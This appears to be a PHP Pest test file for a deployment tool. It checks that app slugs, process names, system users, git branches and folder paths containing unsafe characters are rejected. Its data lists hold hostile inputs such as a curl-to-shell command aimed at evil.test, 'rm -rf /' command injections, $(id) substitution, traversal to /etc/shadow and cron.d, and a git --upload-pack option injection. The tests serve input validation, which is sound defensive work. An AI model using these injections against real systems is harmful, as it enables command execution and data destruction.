<?php

declare(strict_types=1);

use App\Exceptions\UnsafeNameException;
use App\Models\Application;
use App\Services\Caddy\CaddyRouteBuilder;
use App\Services\Deployment\ReleasePaths;
use App\Services\Process\FpmPoolBuilder;
use App\Services\Process\SystemdUnitBuilder;
use App\Services\Runtime\AsdfManager;
use App\Services\SafeName;

test('a traversing process name cannot escape the unit directory', function () {
    (new SystemdUnitBuilder(new AsdfManager))->unitPath(Application::factory()->make(['slug' => 'my-app']), '../../../etc/cron.d/pwn');
})->throws(UnsafeNameException::class);

test('a process name carrying shell metacharacters is refused', function (string $name) {
    (new SystemdUnitBuilder(new AsdfManager))->unitName(Application::factory()->make(['slug' => 'my-app']), $name);
})->with([
    'web; curl evil.test|sh',
    'web && rm -rf /',
    'web`id`',
    'web$(id)',
    "web\nrm -rf /",
    '../../etc/passwd',
    'web worker',
    '',
])->throws(UnsafeNameException::class);

test('a traversing slug cannot be persisted', function () {
    Application::factory()->create(['slug' => '../../../etc/cron.d/pwn']);
})->throws(UnsafeNameException::class);

test('a slug carrying shell metacharacters cannot be persisted', function (string $slug) {
    Application::factory()->create(['slug' => $slug]);
})->with([
    'my-app; rm -rf /',
    'my app',
    'MyApp',
    '../evil',
    'my-app$(id)',
])->throws(UnsafeNameException::class);

test('an unsafe process name cannot be persisted in the processes column', function () {
    Application::factory()->create(['processes' => [['name' => 'worker; rm -rf /', 'command' => '/bin/true']]]);
})->throws(UnsafeNameException::class);

test('an unsafe system user cannot be persisted', function () {
    Application::factory()->create(['system_user' => 'root; rm -rf /']);
})->throws(UnsafeNameException::class);

test('a traversing slug cannot build a release path', function () {
    (new ReleasePaths(Application::factory()->make(['slug' => '../../etc'])))->base();
})->throws(UnsafeNameException::class);

test('a traversing slug cannot build an fpm socket path', function () {
    (new CaddyRouteBuilder)->fpmSocket(Application::factory()->make(['slug' => '../../etc/shadow']));
})->throws(UnsafeNameException::class);

test('a traversing slug cannot build an fpm pool path', function () {
    (new FpmPoolBuilder(new AsdfManager))->poolPath(Application::factory()->make(['slug' => '../../etc/cron.d/x']));
})->throws(UnsafeNameException::class);

test('legitimate names are accepted', function (string $slug) {
    expect(SafeName::isSlug($slug))->toBeTrue();
})->with(['my-app', 'app', 'client-dashboard-2', 'a1']);

test('legitimate process names are accepted', function (string $name) {
    expect(SafeName::isProcess($name))->toBeTrue();
})->with(['web', 'worker', 'queue-worker', 'ssr']);

test('a branch git would read as an option or a pattern cannot be persisted', function (string $branch) {
    Application::factory()->create(['repository_branch' => $branch]);
})->with([
    '--upload-pack=touch /tmp/x',
    '-x',
    'a..b',
    'a b',
    'a;b',
    '$(id)',
    'a/',
    '/a',
    '.hidden',
    'x.lock',
    'a//b',
    'a/.b',
    'a~1',
    'a:b',
    'a*',
    'a@{1}',
    "main\n",
    str_repeat('a', 256),
])->throws(UnsafeNameException::class);

test('ordinary branch names are kept', function (string $branch) {
    expect(Application::factory()->create(['repository_branch' => $branch])->fresh()->repository_branch)->toBe($branch);
})->with(['main', 'production', 'release/2.0', 'feature/x-y', 'v1.2.3', 'hotfix+1', 'dependabot/npm_and_yarn/vite-6.0.1']);

test('an app folder that leaves the repository or breaks a config line cannot be persisted', function (string $column, string $path) {
    Application::factory()->create([$column => $path]);
})->with([
    ['directory', '../other-app'],
    ['directory', 'apps/../../etc'],
    ['directory', 'apps web'],
    ['web_directory', '../../../../etc'],
    ['web_directory', "public\nphp_admin_value[open_basedir] = /"],
    ['web_directory', '/./public'],
    ['web_directory', 'public//assets'],
    ['web_directory', '$(id)'],
])->throws(UnsafeNameException::class);

test('ordinary app folders are kept', function (string $column, string $path) {
    expect(Application::factory()->create([$column => $path])->fresh()->{$column})->toBe($path);
})->with([
    ['directory', '/'],
    ['directory', 'apps/web'],
    ['web_directory', '/public'],
    ['web_directory', 'dist/'],
    ['web_directory', '.output/public'],
]);
